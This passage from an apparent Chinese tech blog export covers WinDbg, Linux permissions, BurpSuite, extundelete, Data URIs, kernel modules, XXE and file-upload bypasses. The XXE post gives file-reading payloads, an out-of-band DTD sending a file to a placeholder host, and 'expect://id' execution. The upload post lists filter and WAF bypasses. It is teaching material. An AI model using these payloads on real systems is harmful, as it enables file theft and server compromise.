3).#ID:指定断点ID.内核调试限32个断点,用户模式不限.#Options:"/1"-&gt;一次性断点."/c"-&gt;指定最大调用深度,大于这个深度断点不工作."/C"-&gt;指定最小调用深度.#Address:地址或符号.#Passes:忽略中断的次数.#CommandString:用于指定一组命令,当断点中断执行这组命令,""包围,;分割命令. bp所设断点与地址关联;bu功能与bp基本相同,但所设断点与符号关联,且所设断点会保存在工作空间中,供下次使用;bm功能与bp基本相同,但支持设置含通配符的断点,可以一次创建一个或多个bu/p断点. 1234ba[ID] Access Size [Options] Address [Passes] ["CommandString"]#Access:指定触发断点的方式."e"-&gt;在读取或执行指令时触发断点,"r"-&gt;在读取数据时触发断点,"w"-&gt;在写入数据时触发断点,"i"-&gt;在执行输入/输出访问时触发断点.#Size:访问的长度.单位为byte,最大为系统字长.#Address:断点地址,需要按Size对齐. 硬件断点最大数量取决于处理器,x86系统支持4个断点.可以通过CommandString设置条件断点. 12bp/u/m/a Address ".if(@eax=0x12ffc4)&#123;&#125;.else&#123;gc&#125;"#gc表示继续执行 12345678bl#列出当前断点bc 1-3,4#删除1,2,3,4号断点bd *#禁止所有断点be 5#启用5号断点 栈命令12345678910111213141516171819202122232425262728293031k # ChildEBP RetAddr00 0061fa4c 77309126 ntdll!LdrpDoDebuggerBreak+0x2b01 0061fcac 772b1d11 ntdll!LdrpInitializeProcess+0x1ba602 0061fd04 772b1c01 ntdll!_LdrpInitialize+0xba03 0061fd10 00000000 ntdll!LdrInitializeThunk+0x1#ChildEBP记录栈帧的基地址,即EBP.kp#把参数和参数值以函数原型的形式显示出来,包括参数类型,名字,取值(要求符号完整)kb # ChildEBP RetAddr Args to Child00 0061fa4c 77309126 2d4a7416 0037b000 00000000 ntdll!LdrpDoDebuggerBreak+0x2b01 0061fcac 772b1d11 2d4a75be 00000000 00000000 ntdll!LdrpInitializeProcess+0x1ba602 0061fd04 772b1c01 00000000 00000000 00000000 ntdll!_LdrpInitialize+0xba03 0061fd10 00000000 0061fd24 77260000 00000000 ntdll!LdrInitializeThunk+0x11#Args to Child是栈上的前三个参数.即ebp+8h,ebp+ch,ebp+10h.kv # ChildEBP RetAddr Args to Child 00 0061fa4c 77309126 2d4a7416 0037b000 00000000 ntdll!LdrpDoDebuggerBreak+0x2b (FPO: [Non-Fpo])01 0061fcac 772b1d11 2d4a75be 00000000 00000000 ntdll!LdrpInitializeProcess+0x1ba6 (FPO: [Non-Fpo])02 0061fd04 772b1c01 00000000 00000000 00000000 ntdll!_LdrpInitialize+0xba (FPO: [Non-Fpo])03 0061fd10 00000000 0061fd24 77260000 00000000 ntdll!LdrInitializeThunk+0x11 (FPO: [Non-Fpo])#kv比kb增加了帧指针省略信息(FPO)和调用约定的显示 kd0061fa4c 0061fcac0061fa50 77309126 ntdll!LdrpInitializeProcess+0x1ba60061fa54 2d4a74160061fa58 0037b0000061fa5c 00000000#...#展示栈中数据. 内存命令查看内存. 123456d? address [L(l)n]#dw:双字节WORD格式,dd:4字节DWORD,dq:8字节格式,df:4字节单精度浮点数格式,dD:8字节双精度浮点数格式,dp:指针大小格式.#da:ASCII字符串,db:字节和ASCII字符串,dc:DWORD和ASCII字符串,du:Unicode字符串,dW:双字节WORD和ASCII字符串,ds:ANSI_STRING类型的字符串格式,dS:UNICODE_STRING类型的字符串格式.#dyb:显示二进制和字节,dyd:显示二进制和DWORD值.dds,dps,dqs显示地址及相关符号.#dt [moduleName!]classname:显示数据类型和数据结构.例如:dt ntdll!*列出NTDLL模块中所有结构.#地址范围可以使用L(l)参数设置,L4表示显示前4个数据. 搜索内存. 1234s -[type] range pattern#type表示搜索内容的数据类型.b-&gt;BYTE,w-&gt;WORD,d-&gt;DWORD,a-&gt;ASCII,u-&gt;Unicode.默认为b#range表示地址范围,可以是起始地址加终止地址,或者起始地址加L(长度),如果长度超过256M,使用"L?length"#pattern用于指定要搜索的内容,可以用空格分隔要搜索的数值 修改内存. 1234e&#123;a|u|za|zu&#125; address "String"#za/zu表示写入内容为以零结尾的ASCII和Unicode字符串,a/u表示不以零结尾.e&#123;a|b|d|D|f|q|u|w&#125; address [values]#a-&gt;ASCII,b-&gt;BYTE,d-&gt;DWORD,D-&gt;DOUBLE,f-&gt;FLOAT,q-&gt;8字节,u-&gt;Unicode,w-&gt;WORD. 显示内存属性. 1!address [Address] 其他常用命令!开头的为扩展命令. !wow64exts.sw:32/64位互相切换. !dh &lt;module&gt;:获取模块映像头信息. !teb:查看当前线程环境块. !peb:查看进程环境块. !exchain:查看当前异常处理链与处理函数. !vadump:查看内存分页信息列表. !heap:查看已有堆. !heap -x [Chunk Address]:检查块是否属于LFH. dt &lt;struct name&gt;:查看数据结构. dt &lt;struct name&gt; &lt;addr&gt;:将指定地址处的数据作为指定的数据结构来解析. .printf &quot;%? %? %?&quot;, arg1, arg2, ...:格式化输出(?代表type,参考as指令支持的type). .sympath+ &lt;path&gt;:添加符号路径,配合.reload(重新载入符号)命令使用. .server tcp:port=&lt;port&gt;:监听端口,等待远程调试. .formats &lt;expr&gt;:以不同的形式显示表达式的值. .echo str:打印字符串. .hh:帮助. lmf/lm:列举出已加载的模块. poi:相当于C语言中对指针的操作符*. r &lt;@eax, ...&gt;&lt;=value&gt;:查看/赋值寄存器组,单纯的r打印所以寄存器. rdmsr/wrmsr:读写MSR寄存器. u addr L(n):对目标地址进行反汇编,L(n)指定行数. 脚本编写WinDbg支持脚本.$$&gt;&lt;c:\text.txt将把c:\text.txt当作脚本运行其中的指令并回显.等同于输入命令. 伪寄存器在表达式中使用伪寄存器必须使用转义字符@. $exentry:当前进程入口地址. $ip指令指针寄存器. $ra:当前函数返回地址. $retreg:函数返回值. $csp:当前栈指针. $tpid:当前进程的PID. $tid:当前线程的标识. $ea:最后一条被执行指令的有效地址. $p:最后一条d命令打印的值. $bpNumber:对应断点的地址. $t0~$t19:自定义伪寄存器. $teb:TEB的地址. $peb:PEB的地址. $thread:PETHREAD地址. $proc:PEPROCESS地址. 别名别名类似define宏,在执行时直接用内容替换.别名有两种,固定别名和自定义别名. 固定别名有$u0~$u9.定义语法为r $.u* = &quot;hello&quot;.r表示赋值. 用于自定义别名的命令有as,ad,al.as位内存中的一些字符串定义别名(as /type name addr,例如as /ma error 04040dc);ad用于删除别名(ad Name,ad *);al用于列出别名. as支持的type:/ma-&gt;ASCII./mu-&gt;Unicode,/msa-&gt;ANSI_STRING,/msu-&gt;UNICODE_STRING,/e-&gt;Environment variable specified,/f-&gt;Specifies the contents of the file,/x-&gt;expr,/c-&gt;result of command. WinDbg预设宏如下. $ntnsym:ntoskrnl基址. $ntwsym:ntdll基址. $ntsym:根据用户态/内核态自动选择. 表达式WinDbg能识别MASM和C++表达式,默认使用MASM表达式(使用.expr查看默认使用的表达式语法).使用@@c++(expr)(或??expr),@@masm(expr)(或?expr)指定表达式求值器. MASM表达式可以使用+,-,*,/算术运算符和一些类似转型运算符. 使用hi/low获得一个32位数的高/低16位. 使用by/wo获得指定地址处的BYTE/WORD. 使用dwo/pwo获得指定地址处的DWORD/QWORD. 使用poi可以获得指定地址处的指针长度的数据. 同时WinDbg还定义了一些特殊的运算符,以$开头. $fnsucc(FnAddress, RetVal, Flag):将RetVal作为位于FnAddress处函数的返回值.如果返回值位成功码则$fnsucc返回TRUE. $iment(Address):返回加载模块列表中的映像入口点地址. $scmp(str1, str2):字符串比较,同strcmp. $sicmp(str1, str2):同stricmp. $spat(str1, Pattern):匹配. $vvalid(Address, Length):判断起始地址位Address,长度为Length的内存是否有效.有效返回1. 在C++表达式中可以使用C++的各种操作符,且表达式中数值默认作为十进制解析,使用0x前缀指定十六进制解析. WinDbg支持两种加入注释的方法:*后所有内容被当成注释;$$后的注释以分号结束. 流程控制语句.if,.else,.elif,.do,.while,.for,.continue,.break,.block(用于定义代码块). 扩展模块WinDbg自带一部分扩展模块,其位于WinDbg的安装目录下,并在WinDbg启动时默认加载. 可以加载一些其他的扩展模块,首先使用_NT_DEBUGGER_EXTENSION_PATH环境变量或者.extpath ExtensionPath来设置搜索路径. .load(DLL):加载扩展模块.等同于! module.extension. .unload(DLL):卸载扩展模块. .chain(List Debugger Extensions):显示已加载的调试扩展及搜索顺序.]]></content>
      <categories>
        <category>binary</category>
        <category>逆向分析</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-Linux-文件属性与权限]]></title>
    <url>%2Fposts%2Fe5e21685%2F</url>
    <content type="text"><![CDATA[文件属性与权限Linux是一个多用户,多用户组,多任务的系统,Linux李账号,密码,用户组信息分别保存在/etc/passwd,/etc/shadow,/etc/group文件中. Linux文件属性中的权限分为文件所有者,用户组和其他人三个隔离的权限组.使用ls -al可以查看这些属性. 1drwxr-xr-x 4 root root 4096 Aug 30 16:53 .cache 第一列有十个字符,第一个字符代表文件的类型,-代表普通文件,d代表目录,l代表连接文件,b代表设备文件中可供存储的接口设备,c代表设备文件中的串行端口设备,p代表管道文件,s代表套接字文件.接下来九个字符分三组,分别代表文件所有者,用户组和其他人的rwx权限,-代表没有此权限. 第二列表示有多少文件名连接到此节点(i-node).第三列表示此文件的所有者.第四列表示此文件的所属用户组.第五列为该文件的大小(单位B).第六列为此文件最近的修改日期(增加--full-time显示详细时间).第七列即文件名. 修改12345chgrp [-R] groupname filename/dirname#改变文件所属用户组#-R表示递归执行,连同子目录与其下的所有文件chown [-R] username[:groupname] filename/dirname#改变文件所有者,可以顺带改变文件所属用户组,也可以只改变文件所属用户组 改变文件权限使用chmod. 1234chmod [-R] xyz filename/dirname#xyz三个数字代表对应三组权限的二进制数,653-&gt;rw-r-x-wxchmod [-R] u=r,g+w,o-x filename/dirname#u-&gt;user,g-&gt;group,o-&gt;others,a-&gt;all.+-=对应原来的意思. 权限的意义对于文件. r:可读取此文件的实际内容. w:可以编辑,新增该文件的内容(不能删除). x:具有被系统执行的权限. 对于目录. r:具有读取目录结构列表的权限,比如可以使用ls. w:具有更改目录结构列表的权限,比如新建/删除/重命名/移动文件或子目录. x:用户进入该目录使其成为工作目录的权限,比如可以使用cd.]]></content>
      <categories>
        <category>CS</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-tool-BurpSuite]]></title>
    <url>%2Fposts%2F8c70e9f0%2F</url>
    <content type="text"><![CDATA[概览BurpSuite是一个基于Java环境的Web应用测试工具.可以对请求的数据包进行拦截和修改,扫描常见的Web安全漏洞,暴力破解登录表单,遍历数据等等. 目录速览. Target:测试目标的列表的概览. Proxy:代理设置,抓取数据包. Spider:应用智能感应的网络爬虫,抓取Web应用程序的链接和内容等. Scanner:扫描Web应用程序漏洞,发现常见Web安全漏洞,存在误报. Intruder:进行Web应用程序模糊测试,进行暴力猜解等. Repeater:对数据包进行重放,用于分析服务器返回情况,判断修改参数的影响. Sequencer:检查Web应用程序提供的会话令牌的随机性,并执行各种测试. Decoder:对数据进行加解密操作,包含url,html,base64等等. Comparer:执行任意的两个请求,响应或任何其它形式的数据之间可视化的比较. Extender:加载扩展,使用自己或第三方代码来扩展BurpSuite的功能. Options:设置. Alerts:存放报错信息. 使用HTTPS代理访问http://burp/cert,将证书下载,浏览器导入证书即可. ProxyProxy功能下有四个子项,Intercept,Options,HTTP histroy,WebSockets history. Intercept相关功能. Forward:将抓取或修改后的数据包发送到服务器端. Drop:丢弃抓取到的数据包. Intercept is on/off:是否拦截数据包,on表示拦截. Action:对该数据包进行操作,同一数据包处右击和Action效果相同. Histroy:记录设置代理后浏览器访问的页面数据包,详细记录数据包的host,method等.对每个请求可以看请求包和响应包信息,也可以发送到其他模块使用.点击上面的Filter可以过滤请求. Options:主要用于设置代理监听请求和响应,拦截响应等等. Intercept Client Requests:配置拦截规则,可以是域名,IP,协议,method,URL等等. Intercept Server Responses:配置拦截规则,基于服务器端的返回情况进行匹配. IntruderIntruder功能下有四个子项,Target,Positions,Payloads,Options. Positions用于选择攻击模式. sniper:对变量依次进行暴力破解. battering ram:对变量同时进行破解. pitchfork:每一个变量标记对应一个字典进行破解. cluster bomb:每个变量对应一个字典,并且进行交叉式破解,尝试各种组合.适用于用户名加密码的破解. 在数据包窗口选择要进行暴力破解的参数,用$包含参数值,表示对该值进行枚举. Payloads对参数设置payload.Payload类型可选择字典方式,爆破方式等 Options设置参数. Request Engine设置请求的线程数,超时重试时间. Grep Match从响应包中提取某些结果,如果匹配成功,则在攻击结果中添加的新列中标明. Grep Extract用于提取响应消息中的有用信息,此选项是从返回包中提取有用的信息. Grep Payloads用于提取响应消息中是否包含Payload的值,比如验证反射性XSS脚本是否成功. ##]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-XXE]]></title>
    <url>%2Fposts%2Fdaf2bb21%2F</url>
    <content type="text"><![CDATA[概览XXE(XML External Entity Injection)全称为XML外部实体注入. 在解析外部实体的过程中,XML解析器可以根据URL中指定的方案(协议)来查询各种网络协议和服务(DNS,FTP,HTTP,SMB等),攻击者可以通过构造恶意输入达成目的. PHP中有XXE漏洞的标志性函数为simplexml_load_string(),会解析外部实体. XMLXML(可扩展标记语言)被设计用来传输和存储数据,XML文档结构包括XML声明,DTD文档类型定义(可选),文档元素. 1234567891011&lt;?xml version="1.0"?&gt;&lt;!-- XML声明 --&gt;&lt;!DOCTYPE message [ &lt;!--定义此文档是message类型的文档--&gt; &lt;!ELEMENT message (msg)&gt; &lt;!--定义message元素有1个子元素--&gt; &lt;!ELEMENT msg (#PCDATA)&gt; &lt;!--定义msg元素为PCDATA类型--&gt;]&gt;&lt;!-- DTD文档类型定义 --&gt;&lt;message&gt; &lt;msg&gt;This is an amazing book&lt;/msg&gt;&lt;/message&gt;&lt;!-- XML文档元素 --&gt; DTD定义XML文档构建模块,使用一系列元素来定义文档的结构.DTD可被成行地声明于XML文档中(内部引用),也可进行外部引用. 1234&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root1 [ ... ]&gt;&lt;!DOCTYPE root2 SYSTEM "xxx.dtd"&gt;&lt;!-- 外部引用 --&gt; DTD文档中重要的关键字:DOCTYPE(DTD的声明);ENTITY(实体的声明);SYSTEM,PUBLIC(外部资源申请). 定义元素为ANY说明接受任何元素.实体可以分成内部实体和外部实体(按定义位置),也可以分为普通实体和参数实体(按定义方式). 内部实体在DTD中定义,可在XML文档中引用;参数实体只能在DTD中申明,DTD中引用. 参数实体还能嵌套定义,但内层定义的参数实体%需要进行HTML转义为&amp;#x25(&amp;#37). 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe1 "test" &gt; &lt;!ENTITY % xxe2 SYSTEM "file://a:/tools/Apache24/htdocs/test.dtd" &gt; %xxe2;]&gt;&lt;!-- &lt;!DOCTYPE foo PUBLIC "publicId" "URI"&gt; --&gt;&lt;foo&gt; &amp;xxe1; &amp;xxe3;&lt;/foo&gt; c:/test.dtd. 12&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!ENTITY xxe3 "test2"&gt; 不同XML解析器支持的协议不一样. 利用对于直接解析的并有回显的,可以读取任意文件. 12345678&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "file://a:/tools/Apache24/htdocs/test.php" &gt;]&gt;&lt;foo&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/foo&gt; CDATA如果要读取的文件有特殊符号,XML解析时就会报错.在XML中可以通过CDATA节将这些特殊字符当做原始的内容处理,&lt;![CDATA[ *** ]]&gt;. 12345678910&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE roottag [ &lt;!ENTITY % start "&lt;![CDATA["&gt; &lt;!ENTITY % text SYSTEM "file://d:/test.txt"&gt; &lt;!ENTITY % end "]]&gt;"&gt; &lt;!ENTITY % dtd SYSTEM "file://a:/tools/Apache24/htdocs/test.dtd"&gt; %dtd;]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; my.dtd. 12&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!ENTITY all "&amp;#37;start;&amp;#37;text;&amp;#37;end;"&gt; 数据发送正常服务一般是没有回显的,通过请求将数据泄露. 123456&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://ip/my.dtd"&gt; %remote; %int; %send;]&gt; my.dtd. 12&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt"&gt;&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:9999?p=%file;'&gt;"&gt; 远程代码执行12345678&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "expect://id" &gt; &lt;!-- expect协议 --&gt;]&gt;&lt;foo&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/foo&gt; 防御禁用外部实体. PHP:libxml_disable_entity_loader(true);. Java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance(); dbf.setExpandEntityReferences(false);. 禁用关键字:SYSTEM,DOCTYPE,ENTITY.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web安全-文件上传漏洞]]></title>
    <url>%2Fposts%2F584c542f%2F</url>
    <content type="text"><![CDATA[概览文件上传漏洞是web安全中经常利用到的一种漏洞形式,属于攻击数据与代码分离原则的一种攻击. 一些web应用程序允许上传图片,文本或者其他资源到指定的位置. 文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中,再通过url去访问以执行代码. 漏洞成因上传文件的后缀名没有做限制;上传文件的MIMETYPE没有检查;web server对于上传文件或者指定目录的行为没有做限制等. 发现对于文件上传漏洞的防护也有很多.前端限制基本无用,修改页面,禁用JS或者burp抓包修改即可. 服务端的检查绕过如下. 对于检查Content-Type(MIMETYPE),使用工具强行篡改Header即可. 对于分析文件头内容来检查文件类型,给上传脚本加上相应的幻数字节即可.php引擎会将&lt;?之前的内容当作html文本. 对于通过黑白名单检查后缀,webserver中存在解析漏洞. IIS5.x-6.x中的目录解析漏洞,/.asp/目录下的一切内容都会被当作asp脚本解析. IIS5.x-6.x中的分号漏洞,IIS在解析文件名的时候可能将分号后面的内容丢弃.如a.asp;.jpg. IIS7/7.5+PHP中如果存在1.jpg,可用1.jpg/1.php形式访问并以php执行. 旧版Windows Server中存在空格和dot漏洞,类似于a.php.和a.php这样的文件名存储后会被windows去掉点和空格. Nginx 0.8.7之前存在空字节漏洞,xxx.jpg%00.php这样的文件名会被解析为php代码运行. apache的解析漏洞,上传如a.php.rar,a.php.gif类型的文件名,由于apache在解析文件名的时候是从右向左读,如果遇到不能识别的扩展名则跳过.rar等扩展名是apache不能识别的. 对于黑名单,还可以后缀大小写绕过,空格绕过,空字符截断等. 同时Web系统还支持其他后缀的解析. 对于限制Web Server对于特定类型文件的行为,可以通过文件上传覆盖对应的配置文件绕过(如.htaccess,修改内容为AddType application/x-http-php .jpg,上传的jpg均以php执行). 常见WAF绕过. 大小上限,WAF对校验的用户数据设置大小上限,此时可以构造一个大文件的木马,前面填充垃圾内容. 针对早期版本的安全狗,可以多加一个filename来绕过. upload-labsupload-labs. 12sudo docker pull c0ny1/upload-labssudo docker run -d -p 80:80 c0ny1/upload-labs:latest Pass-01前端限制,直接控制台覆写js函数function checkFile() {return true;}.]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Forensics-Linux-extundelete]]></title>
    <url>%2Fposts%2F73d21071%2F</url>
    <content type="text"><![CDATA[概览extundelete是Linux上一个磁盘文件恢复工具. 安装与使用1sudo apt-get install extundelete 使用. 123df -h#找到误删文件的分区sudo extundelete /dev/sda1 --restore-all 恢复成功.(时间差不多几分钟,未新建文件)]]></content>
      <categories>
        <category>Forensics</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-FrontEnd-DataURI]]></title>
    <url>%2Fposts%2F187270af%2F</url>
    <content type="text"><![CDATA[概览URI(Uniform Resource Identifier):统一资源标识符,服务器资源名被称为统一资源标识符. URL(Uniform Resource Locator):统一资源定位符,描述了一台特定服务器上某资源的特定位置. URN(Uniform Resource Name):统一资源名称. URL,URN是URI的子集. Data URI scheme允许使用内联的方式在网页中包含数据,目的是将一些小的数据,直接嵌入到网页中,从而不用再从外部文件载入. 使用Data URI scheme支持类型. 123456789101112data:,#文本数据data:text/plain,#文本数据data:text/html,#HTML代码data:text/html;base64,#base64编码的HTML代码data:text/css,#CSS代码data:text/css;base64,#base64编码的CSS代码data:text/javascript,#Javascript代码data:text/javascript;base64,#base64编码的Javascript代码data:image/gif;base64,#base64编码的gif图片数据data:image/png;base64,#base64编码的png图片数据data:image/jpeg;base64,#base64编码的jpeg图片数据data:image/x-icon;base64,#base64编码的icon图片数据 内嵌式. 1&lt;img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAWCAYAAAArdgcFAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAABSUlEQVQ4Ee1VPUsDQRB9s3dBRCRNQvCjkDQW/hJ/gb9AOwWDoIXFgYXYXGP+hYW1/gIr7WzsE8VGxZBcwt04dznCJWw2twtWutXMmzdvlrd7t4SZVbvi1ZihZuCFqT9A/B7Qd5FI44RpPcQpE1oC1IsEq5jRBeGyc0zXaV8mvhbyOREurIRMZMZhp0VthYB9mXBi4jrUztIev1bNbKg6CMxvIWwg5GWVDOHNZ7lX6l/wrG+Fzbh/ca1bf9QWBhKtHznobgtjKF92ZBL3TUWpRbK7LhiVCY8kY3xK/iTiexNcEywSXxKBrfHvrdBN2JRsp4BoQ3dbtHLT4K+JqxWw8vr4YDaf+vR+SmXRWw99lT9N96VaypIYtwgoyWyJRtiX3T+X7TXxROcxGeAo5chlyNcBVxrb2JVpTUHsz4IQi/DL6wPucENxqvoDx69PXP8OKn4AAAAASUVORK5CYII="/&gt; URL式. 1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAWCAYAAAArdgcFAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAACXBIWXMAAAsTAAALEwEAmpwYAAABSUlEQVQ4Ee1VPUsDQRB9s3dBRCRNQvCjkDQW/hJ/gb9AOwWDoIXFgYXYXGP+hYW1/gIr7WzsE8VGxZBcwt04dznCJWw2twtWutXMmzdvlrd7t4SZVbvi1ZihZuCFqT9A/B7Qd5FI44RpPcQpE1oC1IsEq5jRBeGyc0zXaV8mvhbyOREurIRMZMZhp0VthYB9mXBi4jrUztIev1bNbKg6CMxvIWwg5GWVDOHNZ7lX6l/wrG+Fzbh/ca1bf9QWBhKtHznobgtjKF92ZBL3TUWpRbK7LhiVCY8kY3xK/iTiexNcEywSXxKBrfHvrdBN2JRsp4BoQ3dbtHLT4K+JqxWw8vr4YDaf+vR+SmXRWw99lT9N96VaypIYtwgoyWyJRtiX3T+X7TXxROcxGeAo5chlyNcBVxrb2JVpTUHsz4IQi/DL6wPucENxqvoDx69PXP8OKn4AAAAASUVORK5CYII= CSS里使用Data URL. 12345.striped_box&#123; /* ... */ background-image: url("data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7");&#125;]]></content>
      <categories>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[develop-Linux-LKM-入门]]></title>
    <url>%2Fposts%2F2b30a630%2F</url>
    <content type="text"><![CDATA[概览可加载内核模块(LKM)是Linux内核运行时加载和移除代码的机制.可加载内核模块在运行时加载,不运行在用户空间,本质上是内核的一部分. 编写简单内核模块首先要安装Linux内核头文件. 12apt-cache search linux-headers-$(uname -r)sudo apt-get install linux-headers-$(uname -r) 内核模块不是应用程序,没有main()函数.其类似于共享库.其有以下特点. 非顺序执行,内核模块使用初始化函数将自身注册.内核模块处理的请求在模块代码中定义.这与事件驱动编程模型类似. 无自动清理,任何由内核模块申请的内存,必须在模块卸载时手动释放. 内核代码无法访问为Linux用户空间编写的库(如printf).内核模块运行在内核空间,有自己独立的地址空间.内核模块可以通过printk()函数输出信息. 会被中断,内核模块可能会同时被多个程序/进程使用.构建内核模块时需确保在发生中断的时候行为一致和正确. 更高级的执行特权,通常内核模块会比用户空间程序分配更多的CPU周期. 无浮点支持,对用户空间应用,内核代码使用trap来实现整数到浮点模式的转换. 一个简单的内核模块. 12345678910111213141516171819202122232425262728293031//test.c#include &lt;linux/init.h&gt; //用于标记函数的宏,如 __init,__exit.#include &lt;linux/module.h&gt; //加载内核模块到内核使用的核心头文件.#include &lt;linux/kernel.h&gt; //包含内核使用的类型,宏和函数.MODULE_LICENSE("GPL");//许可类型,影响运行时行为.MODULE_AUTHOR("w4rd3n");MODULE_DESCRIPTION("simple module");MODULE_VERSION("0.1");static char * name = "go go go!!!";module_param(name, charp, S_IRUGO);//module_param(name, type, permissions).//type:byte,int,uint,long,ulong,short,ushort,bool,invbool,charp.//permissions:http://www.gnu.org/software/libc/manual/html_node/Permission-Bits.htmlMODULE_PARM_DESC(name, "demo");static int __init go_init(void) &#123; printk(KERN_INFO "init:%s\n", name); //KERN_INFO指定了消息的优先级 return 0;&#125;static void __exit go_exit(void) &#123; printk(KERN_INFO "exit:%s\n", name);&#125;module_init(go_init);module_exit(go_exit);//注册初始化与清理函数. 对应Makefile. 123456obj-m := test.oall: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modulesclean: make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean 编写字符设备驱动字符设备通常和用户应用程序双向传输数据,类似管道和串行接口,即时从字符流中读写字节数据. 字符设备的一种替代是块设备,块设备的行为类似普通文件,允许程序查看缓存数据中的缓冲队列,或是通过读,写等函数进行操作.两种设备类型都可以通过关联到文件系统树上的设备文件进行访问. 设备驱动有关联的主设备号和次设备号.主设备号用于内核在设备访问时能够识别正确的设备驱动,次设备号的角色和设备相关,,主要使用在驱动中. 在/dev目录中执行ls可以看见每个设备的主次设备号. file_operations数据结构定义在/linux/fs.h头文件中,用于保存驱动中的函数指针,允许开发者定义文件操作行为.在线资料. 设备驱动有一个类名和设备名,设备最终显示在文件系统的/sys/class/&lt;className&gt;/&lt;facilityName&gt;中. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/device.h&gt; //支持内核驱动模型#include &lt;linux/kernel.h&gt;#include &lt;linux/fs.h&gt; //支持Linux文件系统#include &lt;asm/uaccess.h&gt; //复制到用户空间函数需要的头文件#include &lt;linux/uaccess.h&gt;#define DEVICE_NAME "mychar"//设备将会展示在/dev/mychar#define CLASS_NAME "w4rd3n"//设备类名,字符设备驱动 MODULE_LICENSE("GPL");MODULE_AUTHOR("w4rd3n");MODULE_DESCRIPTION("simple module");MODULE_VERSION("0.1");static int majorNumber;//主设备号static char message[256] = &#123;0&#125;;//保存从用户空间传输过来的字符串static short size_of_message;//保存的字符串长度 static int numberOpens = 0;//设备打开次数static struct class* mycharClass = NULL;//设备驱动类结构体指针 static struct device* mycharDevice = NULL;//设备驱动设备结构体指针 static int dev_open(struct inode *, struct file *);static int dev_release(struct inode *, struct file *);static ssize_t dev_read(struct file *, char *, size_t, loff_t *);static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);//字符设备操作的函数原型,必须在结构体定义前定义static struct file_operations fops = &#123; .open = dev_open, .read = dev_read, .write = dev_write, .release = dev_release,&#125;;//实现回调函数static int __init mychar_init(void) &#123; printk(KERN_INFO "mychar: Initializing the mychar LKM\n"); majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops); //尝试为这个设备动态生成一个主设备号 if (majorNumber &lt; 0) &#123; printk(KERN_ALERT "mychar failed to register a major number\n"); return majorNumber; &#125; printk(KERN_INFO "mychar: registered correctly with major number %d\n", majorNumber); mycharClass = class_create(THIS_MODULE, CLASS_NAME); //注册设备类 if (IS_ERR(mycharClass)) &#123; unregister_chrdev(majorNumber, DEVICE_NAME); printk(KERN_ALERT "Failed to register device class\n"); return PTR_ERR(mycharClass); &#125; printk(KERN_INFO "mychar: device class registered correctly\n"); mycharDevice = device_create(mycharClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME); //注册设备驱动 if (IS_ERR(mycharDevice)) &#123; class_destroy(mycharClass); unregister_chrdev(majorNumber, DEVICE_NAME); printk(KERN_ALERT "Failed to create the device\n"); return PTR_ERR(mycharDevice); //PTR_ERR()定义于linux/err.h头文件中的函数,用于从指针中抽取出错误码 &#125; printk(KERN_INFO "mychar: device class created correctly\n"); return 0;&#125;static void __exit mychar_exit(void) &#123; device_destroy(mycharClass, MKDEV(majorNumber, 0)); //移除设备 class_unregister(mycharClass); //注销设备类 class_destroy(mycharClass); //移除设备类 unregister_chrdev(majorNumber, DEVICE_NAME); //注销主设备号 printk(KERN_INFO "mychar: Goodbye from the LKM!\n");&#125;static int dev_open(struct inode * inodep, struct file * filep) &#123; numberOpens++; printk(KERN_INFO 